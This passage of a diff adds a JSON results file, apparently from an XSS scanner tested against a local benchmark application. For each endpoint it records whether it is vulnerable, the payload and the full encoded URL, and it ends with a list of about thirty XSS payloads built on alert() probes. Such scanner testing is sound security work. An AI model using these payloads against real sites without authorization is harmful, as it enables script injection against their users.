+   "evidence": {
+    "payload": "</noscript><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/noscript/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fnoscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/noscript/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/object_data/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/object_data/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/object_data/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/object_data/SINGLE_QUOTED_ATTRIBUTE?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/object_data/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/object_data/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/object_param/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/object_param/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/object_param/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/object_param/SINGLE_QUOTED_ATTRIBUTE?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/object_param/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/object_param/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/script_src/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/script_src/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/script_src/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/script_src/SINGLE_QUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/script_src/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/script_src/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/style_attribute_value/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/style_attribute_value/DOUBLE_QUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/style_attribute_value/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/style_attribute_value/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/style_attribute_value/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/style_attribute_value/UNQUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/tagname/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/tagname/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/tagname/HTML": {
+   "evidence": {
+    "payload": "x onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/tagname/HTML?q=x%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/tagname/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/tagname/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/tagname/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "x onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/tagname/UNQUOTED_ATTRIBUTE?q=x%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/textarea/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</textarea><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/textarea/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Ftextarea%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/textarea/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/textarea/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</textarea><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/textarea/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Ftextarea%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/textarea/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/textarea_attribute_value/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/textarea_attribute_value/DOUBLE_QUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/textarea_attribute_value/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/textarea_attribute_value/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/textarea_attribute_value/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/textarea_attribute_value/UNQUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/title/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</title><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/title/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Ftitle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/title/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/title/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</title><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/title/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Ftitle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/title/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/parameter/attribute_name": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/attribute_name?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/attribute_quoted": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/attribute_quoted?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/attribute_script": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/attribute_script?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/attribute_singlequoted": {
+   "evidence": {
+    "payload": "'><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/attribute_singlequoted?q=%27%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/attribute_unquoted": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/attribute_unquoted?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/body": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/body?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/body_comment": {
+   "evidence": {
+    "payload": "--><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/body_comment?q=--%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/css_import": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/css_import?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/css_style": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/css_style?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/css_style_font_value": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/css_style_font_value?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/css_style_value": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/css_style_value?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/form": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/form?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/form_in_new_window": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/form_in_new_window?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/head": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/head?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/href": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/href?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/iframe_attribute_value": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/iframe_attribute_value?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/iframe_srcdoc": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/iframe_srcdoc?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_assignment": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_assignment?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_comment": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_comment?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_escape_doublequotes_eval": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_escape_doublequotes_eval?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_eval": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_eval?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_eventhandler_quoted": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_eventhandler_quoted?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_eventhandler_singlequoted": {
+   "evidence": {
+    "payload": "'><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_eventhandler_singlequoted?q=%27%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_eventhandler_unquoted": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_eventhandler_unquoted?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_quoted_string": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_quoted_string?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_singlequoted_string": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_singlequoted_string?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/js_slashquoted_string": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/js_slashquoted_string?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/json": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/json?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/noscript": {
+   "evidence": {
+    "payload": "</noscript><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/noscript?q=%3C%2Fnoscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/object_data": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/object_data?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/object_param": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/object_param?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/script_src": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/script_src?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/style_attribute_value": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/style_attribute_value?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/tagname": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/parameter/tagname?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/textarea": {
+   "evidence": {
+    "payload": "</textarea><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/textarea?q=%3C%2Ftextarea%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/textarea_attribute_value": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/textarea_attribute_value?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  },
+  "/reflected/parameter/title": {
+   "evidence": {
+    "payload": "</title><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/parameter/title?q=%3C%2Ftitle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "reflected",
+   "vulnerable": true
+  }
+ },
+ "payloads": [
+  "<script>alert(914771)</script>",
+  "<img src=x onerror=alert(914771)>",
+  "<svg onload=alert(914771)>",
+  "\"><svg onload=alert(914771)>",
+  "'><svg onload=alert(914771)>",
+  "\"><img src=x onerror=alert(914771)>",
+  "'><img src=x onerror=alert(914771)>",
+  " onmouseover=alert(914771) ",
+  "x onmouseover=alert(914771) ",
+  "\" onmouseover=\"alert(914771)",
+  "' onmouseover='alert(914771)",
+  "img src=x onerror=alert(914771)",
+  "svg onload=alert(914771)",
+  "</title><svg onload=alert(914771)>",
+  "</textarea><svg onload=alert(914771)>",
+  "</style><svg onload=alert(914771)>",
+  "</noscript><svg onload=alert(914771)>",
+  "</script><svg onload=alert(914771)>",
+  "</iframe><svg onload=alert(914771)>",
+  "--><svg onload=alert(914771)>",
+  "*/alert(914771)/*",
+  "*/alert(914771)//",
+  "';alert(914771)//",
+  "\";alert(914771)//",
+  "\\';alert(914771)//",
+  "</script><script>alert(914771)</script>",
+  "alert(914771)",
+  ";alert(914771);",
+  "javascript:alert(914771)",
+  "/;alert(914771)//"
+ ]
+}
